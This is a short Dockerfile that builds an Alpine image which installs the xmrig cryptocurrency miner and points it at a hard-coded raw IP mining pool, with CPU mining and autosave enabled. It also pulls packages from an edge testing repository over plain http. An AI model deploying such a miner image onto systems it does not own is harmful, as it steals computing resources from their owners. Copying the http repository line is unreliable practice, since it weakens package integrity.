FROM alpine:latest
LABEL Name="alpinexmrig" Version="0.0.1"
RUN echo 'https://dl-cdn.alpinelinux.org/alpine/edge/community' >> /etc/apk/repositories \
    && echo 'http://dl-cdn.alpinelinux.org/alpine/edge/testing' >> /etc/apk/repositories \
    && apk add xmrig \
    && echo '{"autosave": true,"cpu": true, "opencl": false, "cuda": false,"pools": [ {  "url": "172.241.166.110:443",  "tls": true }]}' >> /usr/bin/config.json
CMD [ "xmrig" ]
